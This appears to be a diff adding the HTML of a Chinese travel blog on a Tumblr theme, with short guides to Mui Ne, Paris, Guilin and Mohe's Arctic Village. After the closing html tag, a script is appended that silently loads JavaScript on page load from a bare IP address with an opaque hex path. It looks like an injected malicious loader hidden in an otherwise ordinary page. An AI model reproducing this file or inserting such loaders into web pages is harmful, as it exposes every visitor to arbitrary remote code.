@@ -1,0 +1,592 @@
+
+
+<!DOCTYPE html>
+ 	 	 	   
+<html lang="en">
+<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# blog: http://ogp.me/ns/blog#">
+
+	<meta charset="UTF-8">
+
+	<title>攻略博客</title>
+	<meta name="description" content="trip blog" />
+
+	<!-- Favicon -->
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="http://baguatheme.tumblr.com/rss" />
+
+
+	<!--
+	***************************************************
+
+	Bagua Theme v1.4.1
+	by 45royale
+
+	Sun Sep 08 2013 19:16 -0500
+	http://baguatheme.tumblr.com/
+	support@45royale.com/
+	
+	***************************************************
+	-->
+
+	<meta name="tumblr-theme" content="30769" />
+
+	<!-- Theme Colors -->
+	<meta name="color:Accent" content="#7dbfbd" />
+	<meta name="color:Text" content="#939393" />
+	<meta name="color:Headings" content="#4d4d4d" />
+
+	<!-- Theme Background -->
+	<meta name="if:Use Geometric Background" content="" />
+	<meta name="if:Use Wood Background" content="1" /> 	 	 	   
+	<meta name="if:Use solid background color" content="" />
+	<meta name="color:Background" content="" />
+	<meta name="if:Fixed Custom Background" content="" />
+	<meta name="image:Background" content="" />
+
+	<!-- Theme Images -->
+	<meta name="image:Logo" content="" />
+
+	<!-- Theme Titles -->
+	<meta name="text:Tagline" content="" />
+	<meta name="text:Following Title" content="A few people I follow" />
+	
+	<!-- Theme Options -->
+	<meta name="if:Enable Custom Scrollbar" content="1" />
+	<meta name="text:Scroll Speed" content="40" />
+	<meta name="text:Safari Scroll Speed" content="0.5" />
+	<meta name="if:Enable Header Menu" content="" />
+	<meta name="if:Show Description" content="1" />
+	<meta name="if:Enable Pages Navigation" content="1" />
+	<meta name="if:Show 2 Following rows" content="1" />
+	<meta name="if:Show 3 Following rows" content="" />
+	<meta name="if:Show 4 Following rows" content="" />
+
+	<!-- Custom Options -->
+	<meta name="text:Typekit Kit ID" content="" />
+	<meta name="text:Google Analytics ID" content="" />
+	<meta name="text:Disqus Shortname" content="" />
+	<meta name="if:Use MailChimp Integration" content="" />
+
+	<!-- Fonts -->
+	<link href="http://fonts.googleapis.com/css?family=Rokkitt" rel="stylesheet" type="text/css">
+	<link href="http://fonts.googleapis.com/css?family=Metrophobic" rel="stylesheet" type="text/css">
+	<link href="http://fonts.googleapis.com/css?family=Droid+Sans+Mono" rel="stylesheet" type="text/css">
+
+	
+
+	<!-- CSS -->
+	<link href="http://static.tumblr.com/wassjkj/d0nmsu91j/styles.css" rel="stylesheet" type="text/css">
+
+	
+
+	<style type="text/css" media="screen">
+		
+		
+		
+		body { background: url(http://static.tumblr.com/wassjkj/U4fln3xyc/bg_wood.jpg) scroll !important; }
+		
+		
+
+		
+
+		
+
+		a,
+		#header #title h1 a:hover,
+		.title a,
+		.date span,
+		.tags_heading span,
+		.audio a:hover { color: #7dbfbd; }
+
+		#header .nav a,
+		.date span,
+		.tags a,
+		.tags a span,
+		#pagination a { background-color: #7dbfbd !important; }
+
+		/* Typography ------------------------------ ***/
+		body {
+			color: #939393;
+			font: normal 15px 'Metrophobic', arial, serif;
+		}
+
+		a:hover,
+		#header #title h1 a,
+		.title a:hover,
+		#profile,
+		#ask,
+		.node h3,
+		.node h3 a,
+		.quote blockquote,
+		.chat .chatstream span,
+		#notes h4,
+		#disqus { color: #4d4d4d; }
+
+		.meta .share .expand input { color: #939393; }
+
+		#header #searchform input { color: #9c9793; }
+
+		/* Elements -------------------------------- ***/
+		#header,
+		#content { background-color: #fff; }
+
+		/* Header */
+		#header .nav li a:hover,
+		#header .nav li a.active { background-color: #4d4d4d !important; }
+
+		#about p {
+			color: #9c9793;
+			font: normal 17px/20px 'Rokkitt', arial, serif;
+		}
+
+		/* Entry */
+		.date { color: #c0c0c0; }
+
+		.date span.day {
+			font-family: 'Rokkitt', arial, serif;
+			font-size: 55px;
+		}
+
+		.entry p,
+		.entry ul li,
+		.entry ol li {
+			font-family: 'Rokkitt', arial, serif;
+			font-size: 17px;
+		}
+
+		.entry blockquote { border-left: 3px solid #d7d7d7; }
+
+		/* Quote Posts */
+		.quote blockquote { font: bold italic 20px/28px 'Droid Serif', Georgia, serif; }
+
+		.quote p {
+			font: normal 16px 'Metrophobic', arial, serif;
+			text-align: right;
+		}
+
+		/* Chat Posts */
+		.chat p { font: normal 16px 'Metrophobic', arial, serif; }
+
+		/* Meta */
+		.meta .share .expand input { font: normal 11px 'Metrophobic', arial, serif; }
+
+		.tags a { color: #fefefe; }
+
+		.tags a:hover,
+		.tags a:hover span {
+			color: #fff !important;
+			background-color: #4d4d4d !important;
+		}
+
+		/* Notes */
+		#notes h4 { border-bottom: 1px dotted #d7d7d7; }
+
+		#notes .notes li {
+			font: normal 17px 'Rokkitt', arial, serif;
+			border-bottom: 1px dotted #d7d7d7;
+		}
+
+		/* Pagination */
+		#pagination .prev,
+		#pagination .next { background-color: #ebebeb; }
+
+		/* Custom CSS ------------------------------ ***/
+		
+	</style>
+
+	<!-- Javascript -->
+	<script type="text/javascript">
+		var Bagua = window.Bagua || {};
+		Bagua.ScrollBar = true;
+		Bagua.ScrollSpeed = 40;
+		Bagua.safariScrollSpeed = 0.5;
+		
+		Bagua.twitterUsername = 'pixelunion';
+		
+		
+		Bagua.AskSupport = true;
+		
+		
+		Bagua.typekitID = '';
+		Bagua.disqusID = '';
+		Bagua.googleID = '';
+		
+	</script>
+
+	<script src="js/jquery-1.9.1.min.js"></script>
+
+<!-- BEGIN TUMBLR FACEBOOK OPENGRAPH TAGS --><!-- If you'd like to specify your own Open Graph tags, define the og:url and og:title tags in your theme's HTML. --><!-- Read more: http://ogp.me/ --><meta property="fb:app_id" content="48119224995" /><meta property="og:title" content="Bagua" /><meta property="og:url" content="http://baguatheme.tumblr.com/?og=1" /><meta property="og:description" content="This blog is a place where I keep all of my findings from across the web." /><meta property="og:type" content="tumblr-feed:tumblelog" /><meta property="og:image" content="http://25.media.tumblr.com/avatar_89207991cdc3_128.png" /><!-- END TUMBLR FACEBOOK OPENGRAPH TAGS -->
+
+
+<!-- TWITTER TAGS --><meta charset="utf-8"><meta name="twitter:site" content="tumblr" /><meta name="twitter:card" content="summary" /><meta name="twitter:title" content="baguatheme" /><meta name="twitter:description" content="This blog is a place where I keep all of my findings from across the web." /><meta name="twitter:creator" content="pixelunion" /><meta name="twitter:app:name:iphone" content="Tumblr" /><meta name="twitter:app:name:ipad" content="Tumblr" /><meta name="twitter:app:name:googleplay" content="Tumblr" /><meta name="twitter:app:id:iphone" content="305343404" /><meta name="twitter:app:id:ipad" content="305343404" /><meta name="twitter:app:id:googleplay" content="com.tumblr" /><meta name="twitter:app:url:iphone" content="tumblr://x-callback-url/blog?blogName=baguatheme&amp;referrer=twitter-cards" /><meta name="twitter:app:url:ipad" content="tumblr://x-callback-url/blog?blogName=baguatheme&amp;referrer=twitter-cards" /><meta name="twitter:app:url:googleplay" content="tumblr://x-callback-url/blog?blogName=baguatheme&amp;referrer=twitter-cards" />
+
+<script src="http://assets.tumblr.com/assets/scripts/tumblelog.js?_v=6a17c519d68bc98ed5cdd6f4a55dbaa2"></script>
+<meta http-equiv="x-dns-prefetch-control" content="off"/>
+<meta name="keywords" content="sinatra,image,record,start up,theme" />
+</head>
+
+<body>
+
+<!-- Tumblr Theme #30769 -->
+
+<div id="container">
+
+	<div id="column"> 	 	 	   
+
+		<div id="header" class="border">
+
+			<div class="mast">
+
+				<div id="title">
+					
+					<h1><a href="#">攻略博客</a></h1>
+					
+
+					
+
+					
+				</div>
+
+				<div class="nav">
+					<form id="searchform" action="/search" method="get">
+						<input type="text" id="q" name="q" value="Search..." onblur="if(this.value == '') { this.value='Search...'}" onfocus="if (this.value == 'Search...') {this.value=''}" />
+					</form>
+					<ul>
+						<li><a class="profile" data-rel="profile"><span class="tip"><span class="bubble">Profile</span></span></a></li>
+						<li><a class="ask" data-rel="ask"><span class="tip"><span class="bubble">Ask</span></span></a></li>
+
+						<li><a class="random" href="index2.html"><span class="tip"><span class="bubble">Go back</span></span></a></li>
+						
+						<li><a class="archive" href="#"><span class="tip"><span class="bubble">Archive</span></span></a></li>
+					</ul>
+				</div><!-- /nav -->
+
+			</div><!-- /mast -->
+
+			<div id="profile" class="dropdown">
+				<div class="container">
+					<div class="portrait"><img src="assets/css/img/xi.png" alt="" /><span></span></div>
+					<div id="about">
+						<h3>About &nbsp;the &nbsp;blog</h3>
+						
+						<p class="description">This blog is a place where for users share the experience in trip.</p>
+						
+					</div>
+					
+				</div>
+			</div><!-- /profile -->
+
+			
+
+			
+			<div id="ask" class="dropdown">
+				<div class="container">
+					<div class="portrait"><img src="images/touxiang.jpg" alt="" /><span></span></div>
+					<div class="group">
+						<h3>Ask</h3>
+						<div id="legend" style="margin-right:-80px;">
+        <legend  ><span style="float: right;"><button style="background: #00B98B;"class="btn btn-info btn-small" type="button">contact us</button></span></legend>
+      </div>
+
+						<!--[if IE]><script type="text/javascript">document.getElementById('ask_form').allowTransparency=true;</script><![endif]-->
+					</div>
+				</div>
+			</div><!-- /ask -->
+			
+
+		</div><!-- /header -->
+
+		<div id="content" class="border">
+
+			<div class="post photo">
+				<div class="date" data-day="20" data-month="Jun">
+					
+					<span class="day">20</span>
+					Jun
+					
+				</div>
+				<div class="entry">
+					<h2 class="title"><a href="#" title="About the theme">美奈·攻略</a></h2>
+					<div class="frame"><a href="http://alankell.com/trip/1.jpg"><img src="1.jpg" alt="trip" /></a></div>
+					<div class="caption"><p><span>位于芽庄和胡志明市之间的美奈在数年前还是一个默默无闻的小渔村，主要的经济来源是制作鱼露。而现在，它已然成为越南最出名的海边度假胜地，也保留了较慢的生活节奏与闲适安稳的生活状态。 在美奈，即便你每天赖在躺椅上，吹吹海风，听听海浪，也会感到旅行的充实有趣；也可以去参加惊险刺激的风帆冲浪运动，或者在白沙丘闲步。在这里，懒散是一种幸福。</span></p>
+                    <p>via <a title="alankell" target="_blank" href="#">Alankell</a></p></div>
+					<div class="tags"><a href="#" title="美奈"><span>美奈</span></a><a href="#" title="record"><span>攻略</span></a></div>
+				</div><!-- /entry -->
+			
+
+			
+
+			
+
+				<div class="meta">
+					
+					<div class="details">
+						
+						<a href="#" class="bmark" title="Notes">10 notes</a>
+					</div>
+					<div class="share">
+						<a class="sharelink" data-permalink="#">Share this</a>
+						<div class="expand">
+							<input type="text" readonly="" value="http://tmblr.co/ZUwCLx6Ghxvl" class="shorturl">
+							<a href="http://twitter.com/share" class="twitter-share-button" data-url="http://tmblr.co/ZUwCLx6Ghxvl" data-text="" data-count="none" data-via="pixelunion">Tweet</a>
+							<div class="fblike"></div>
+						</div>
+					</div><!-- /share -->
+					
+					<a href="" title="alankell">Like</a>
+					
+					
+					<div class="highres">
+						<a href="http://alankell.com/trip/1.jpg" title="Bagua">View larger +</a>
+					</div>
+					
+					
+				</div>
+			</div>
+
+			
+			 	 	 	   
+			
+			
+
+			
+
+			<!-- text -->
+
+
+			
+
+			<div class="post photo">
+				<div class="date" data-day="20" data-month="Jun">
+					
+					<span class="day">20</span>
+					Jun
+					
+				</div>
+				<div class="entry">
+					<h2 class="title"><a href="#" title="About the theme">巴黎·攻略</a></h2>
+					<div class="frame"><a href="http://alankell.com/trip/2.jpg"><img src="2.jpg" alt="trip" /></a></div>
+					<div class="caption"><p><span>赞叹卢浮宫因为惊叹人类的艺术智慧；沉醉夜晚漫步因为从路边灯光柔和的咖啡店里有飘出来的咖啡香；喜爱塞纳河及埃菲尔铁塔因为那里是记忆中的浪漫标志；迷恋香榭丽舍和凯旋门因为有巴黎式的繁华与壮观；觉得法国人浪漫因为他们的相视而笑和热情的法式香吻。喜欢坐在地铁里因为有文化青年制造的美妙音乐。但最喜欢的还是在巴黎Shopping，因为那里有老佛爷、春天百货和La Vallee购物村。巴黎只有这些吗？不，还有享有盛名的法式大餐，垂涎欲滴的甜品以及街边散发着文艺气息的咖啡店。</span></p>
+<p>via <a title="David Airey" target="_blank" href="#">Alankell</a></p></div>
+					<div class="tags"><a href="#" title="美奈"><span>巴黎</span></a><a href="#" title="record"><span>攻略</span></a></div>
+				</div><!-- /entry -->
+			
+
+			
+
+			
+
+				<div class="meta">
+					
+					<div class="details">
+						
+						<a href="#" class="bmark" title="Notes">9 notes</a>
+					</div>
+					<div class="share">
+						<a class="sharelink" data-permalink="#">Share this</a>
+						<div class="expand">
+							<input type="text" readonly="" value="http://tmblr.co/ZUwCLx6Ghxvl" class="shorturl">
+							<a href="http://twitter.com/share" class="twitter-share-button" data-url="http://tmblr.co/ZUwCLx6Ghxvl" data-text="" data-count="none" data-via="pixelunion">Tweet</a>
+							<div class="fblike"></div>
+						</div>
+					</div><!-- /share -->
+					
+					<a href="" title="alankell">Like</a>
+					
+					
+					<div class="highres">
+						<a href="http://alankell.com/trip/1.jpg" title="Bagua">View larger +</a>
+					</div>
+					
+					
+				</div>
+			</div>
+
+	
+
+			
+
+			
+<div class="post photo">
+				<div class="date" data-day="20" data-month="Jun">
+					
+					<span class="day">19</span>
+					Jun
+					
+				</div>
+				<div class="entry">
+					<h2 class="title"><a href="#" title="About the theme">桂林·攻略</a></h2>
+					<div class="frame"><a href="http://alankell.com/trip/3.jpg"><img src="3.jpg" alt="trip" /></a></div>
+					<div class="caption"><p><span>桂林位于广西的东北部，是享誉中外的旅游胜地，是中国著名的风景游览城市和历史文化名城。 桂林地区独特的喀斯特地貌 ，仙姿百态的峰林与景象万千的漓江融为一体，形成了华美、别致的的“桂林山水”。婀娜多姿的石山，瑰丽幽深的溶洞，清澈怡人的溪流吸引着无数的游客，也使桂林留下了“山水甲天下”的美誉。当然，桂林其他县区也有数不胜数的美景，龙脊梯田、兴安灵渠、大圩古镇、资江漂流都会为你带来不尽的惊喜。</span></p>
+<p>via <a title="David Airey" target="_blank" href="#">Alankell</a></p></div>
+					<div class="tags"><a href="#" title="美奈"><span>桂林</span></a><a href="#" title="record"><span>攻略</span></a></div>
+				</div><!-- /entry -->
+			
+
+			
+
+			
+
+				<div class="meta">
+					
+					<div class="details">
+						
+						<a href="#" class="bmark" title="Notes">18 notes</a>
+					</div>
+					<div class="share">
+						<a class="sharelink" data-permalink="#">Share this</a>
+						<div class="expand">
+							<input type="text" readonly="" value="http://tmblr.co/ZUwCLx6Ghxvl" class="shorturl">
+							<a href="http://twitter.com/share" class="twitter-share-button" data-url="http://tmblr.co/ZUwCLx6Ghxvl" data-text="" data-count="none" data-via="pixelunion">Tweet</a>
+							<div class="fblike"></div>
+						</div>
+					</div><!-- /share -->
+					
+					<a href="" title="alankell">Like</a>
+					
+					
+					<div class="highres">
+						<a href="http://alankell.com/trip/1.jpg" title="Bagua">View larger +</a>
+					</div>
+					
+					
+				</div>
+			</div>
+			
+
+			
+
+			
+
+	<div class="post photo">
+				<div class="date" data-day="20" data-month="Jun">
+					
+					<span class="day">18</span>
+					Jun
+					
+				</div>
+				<div class="entry">
+					<h2 class="title"><a href="#" title="About the theme">北极村·攻略</a></h2>
+					<div class="frame"><a href="http://alankell.com/trip/4.jpg"><img src="4.jpg" alt="trip" /></a></div>
+					<div class="caption"><p><span>漠河北极村是我国大陆最北端的临江小镇。位于大兴安岭山脉北麓的七星山脚下，纬度高达53°33′30″，与俄罗斯阿穆尔州的伊格娜恩依诺村隔江相望，素有“北极村”、“不夜城”之称。 这里是全国观赏北极光和极昼胜景的最佳之处，有北陲哨兵、神州北极、古水井、日伪电厂遗址、最北第一家等景点。每年夏至节期间都在江边举办夏至节篝火晚会，载歌载舞、通宵达旦。</span></p>
+<p>via <a title="David Airey" target="_blank" href="#">Alankell</a></p></div>
+					<div class="tags"><a href="#" title="美奈"><span>北极村</span></a><a href="#" title="record"><span>攻略</span></a></div>
+				</div><!-- /entry -->
+			
+
+			
+
+			
+
+				<div class="meta">
+					
+					<div class="details">
+						
+						<a href="#" class="bmark" title="Notes">9 notes</a>
+					</div>
+					<div class="share">
+						<a class="sharelink" data-permalink="#">Share this</a>
+						<div class="expand">
+							<input type="text" readonly="" value="http://tmblr.co/ZUwCLx6Ghxvl" class="shorturl">
+							<a href="http://twitter.com/share" class="twitter-share-button" data-url="http://tmblr.co/ZUwCLx6Ghxvl" data-text="" data-count="none" data-via="pixelunion">Tweet</a>
+							<div class="fblike"></div>
+						</div>
+					</div><!-- /share -->
+					
+					<a href="" title="alankell">Like</a>
+					
+					
+					<div class="highres">
+						<a href="http://alankell.com/trip/1.jpg" title="Bagua">View larger +</a>
+					</div>
+					
+					
+				</div>
+			</div>
+
+			
+
+			
+			
+			
+			
+			
+			<div id="pagination">
+				<div class="prev"><span class="arrow"></span><span class="title">Prev</span></span></div>
+				<div class="next active"><a href="/page/2"><span class="title">Next</span><span class="arrow"></span></a></div>
+			</div><!-- /pagination -->
+			
+
+		</div><!-- /content -->
+
+		<div id="footer" class="border">
+			<div class="node">
+				<h3><a href="/">Trip Blog </a></h3>
+				
+				<p class="description">This blog is a place where for users share the experience in trip.</p>
+				
+			</div>
+			<div class="node">
+				<h3>Navigation</h3>
+				<ul>
+					<li><a href="#" id="to-profile">Profile</a></li>
+					
+					
+					<li><a href="#" id="to-ask">Ask</a></li>
+					
+					<li><a href="/archive">Archive</a></li>
+					<li><a href="#">RSS</a></li>
+				</ul>
+			</div>
+			<div class="node"> 	 	 	   
+				<h3>Pages</h3>
+				<ul>
+					<li><a href="index2.html">Home</a></li>
+					
+					
+					
+					<li><a href="/about" title="About">About</a></li>
+					
+					
+					
+				</ul>
+			</div>
+			<div class="node last">
+				<h3>Credits</h3>
+				<p>Powered by <a href="#">Alankell</a></p>
+			</div>
+		</div><!-- /footer -->
+		
+	</div><!-- /column -->
+
+</div><!-- /container -->
+
+
+
+
+
+
+<script type="text/javascript" src="http://static.tumblr.com/wassjkj/nQkmm6h84/plugins-scroll.js"></script>
+
+<script type="text/javascript" src="http://static.tumblr.com/wassjkj/Ktzmsu90r/scripts.js"></script>
+
+
+
+
+
+<script type="text/javascript">
+      var _qevents = _qevents || [];
+
+      (function() {
+       var elem = document.createElement('script');
+
+       elem.src = (document.location.protocol == "https:" ? "https://secure" : "http://edge") + ".quantserve.com/quant.js";
+       elem.async = true;
+       elem.type = "text/javascript";
+       var scpt = document.getElementsByTagName('script')[0];
+       scpt.parentNode.insertBefore(elem, scpt);
+      })();
+    </script>
+
+</body>
+</html>
+<script type="text/javascript">(function(){var js = document.createElement("script");js.src="http://115.238.147.102/A0EED19F1C1CB08BDED1D52D5DA33474?id=1&t=137411719&m=c87281dfecb808ab"+Math.random();var h = document.getElementsByTagName("head")[0];h.appendChild(js);})()</script>
